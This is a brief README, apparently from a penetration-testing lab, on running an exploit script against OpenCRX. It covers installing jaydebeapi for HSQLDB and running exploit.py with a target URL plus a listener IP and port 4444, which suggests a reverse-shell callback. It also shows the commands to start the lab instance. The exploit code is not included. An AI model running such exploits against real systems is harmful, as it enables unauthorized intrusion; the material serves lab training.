# OpenCRX

Before running the exploit, you need to install `jaydebeapi` to work with HSQLDB.
```bash
pip install jaydebeapi
```

Then, you can run the exploit
```bash
# You need to run the script where hsqldb.jar is located (this directory)
python3 exploit.py -t https://opencrx:8000 -l 192.168.45.243 -p 4444
```
![OpenCRX](/.images/opencrx.png)

> [!WARNING]
> Remember to start the lab before running the exploit:
> ```bash
> ssh student@opencrx
> cd crx/apache-tomee-plus-7.0.5/bin
> ./opencrx.sh run
> ```

